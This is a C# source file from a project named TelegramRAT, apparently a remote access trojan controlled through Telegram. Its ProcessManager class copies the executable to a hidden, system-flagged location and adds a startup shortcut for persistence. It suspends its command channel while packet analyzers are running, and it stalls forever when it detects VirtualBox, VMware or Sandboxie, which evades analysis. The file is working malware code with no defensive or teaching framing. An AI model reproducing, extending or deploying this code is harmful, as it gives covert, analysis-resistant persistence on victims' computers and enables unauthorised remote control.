using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System;
using IWshRuntimeLibrary;

namespace TelegramRAT
{
    public static class ProcessManager
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void InstallAndAddToStartup()
        {
            string installDir = Environment.ExpandEnvironmentVariables(Config.installPath);
            if (!Directory.Exists(Path.GetDirectoryName(installDir)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(installDir));
            }
            if (!System.IO.File.Exists(installDir))
            {
                System.IO.File.Copy(Application.ExecutablePath, installDir);
                DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(installDir));
                FileInfo file = new FileInfo(installDir);
                // Hidden
                dir.Attributes |= FileAttributes.Hidden;
                file.Attributes |= FileAttributes.Hidden;

                // System attribute, so it is not displayed in file explorer
                dir.Attributes |= FileAttributes.System;
                file.Attributes |= FileAttributes.System;
            }

            string startupDir = Environment.ExpandEnvironmentVariables(Config.startupPath);
            if (!System.IO.File.Exists(startupDir))
            {
                CreateShortcut(startupDir, installDir);
            }
        }

        private static void CreateShortcut(string shortcutPath, string targetPath)
        {
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = targetPath;
            shortcut.Save();
        }

        public static void ProcessChecker(TelegramAPI tg)
        {
            if (!Config.checkForPacketAnalyzers)
            {
                return;
            }

            string proc;
            while (true)
            {
                List<string> processList = GetProcessList();
                foreach (string process in Config.PacketAnalyzersList)
                {
                    proc = process.ToUpper();
                    if (processList.Contains(proc))
                    {
                        // If the process is running, stop receiving commands
                        if (!tg.isBlocked)
                        {
                            tg.isBlocked = true;
                            // Polling until the process stops
                            while (true)
                            {
                                processList = GetProcessList();
                                if (!processList.Contains(proc))
                                {
                                    tg.isBlocked = false;
                                    tg.SendMessage("A packet analyser was found: " + process + ".exe");
                                    break;
                                }
                                // Small delay
                                Thread.Sleep(3000);
                            }
                            break;
                        }
                    }
                }
                Thread.Sleep(1500);
            }
        }

        private static List<string> GetProcessList()
        {
            List<string> output = new List<string>();

            foreach (Process proc in Process.GetProcesses())
            {
                output.Add(proc.ProcessName.ToUpper());
            }
            return output;
        }

        public static void CheckIfBeingAnalyzed()
        {
            if (Config.checkForVMAndSandboxie)
            {
                // If I am being analysed, do nothing
                if (InVirtualBox() || InSandboxie())
                {
                    Thread.Sleep(-1);
                }
            }
        }

        public static bool InVirtualBox()
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
            {
                string manufacturer = string.Empty;
                int i = 0;
                foreach (ManagementObject mo in searcher.Get())
                {
                    i++;
                    PropertyDataCollection searcherProperties = mo.Properties;
                    foreach (PropertyData sp in searcherProperties)
                    {
                        if (sp.Name == "Manufacturer")
                        {
                            manufacturer = sp.Value.ToString();
                        }
                    }
                }
                if (manufacturer.ToUpper().Contains("VM") || manufacturer.ToUpper().Contains("innotek".ToUpper()))
                    return true;
            }
            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
            {
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    return true;
                }
            }
            return false;
        }

        private static bool InSandboxie()
        {
            string[] array = new string[5]
            {
                "SbieDll.dll",
                "SxIn.dll",
                "Sf2.dll",
                "snxhk.dll",
                "cmdvrt32.dll"
            };
            for (int i = 0; i < array.Length; i++)
            {
                if (GetModuleHandle(array[i]).ToInt32() != 0)
                {
                    return true;
                }
            }
            return false;
        }


    }
}
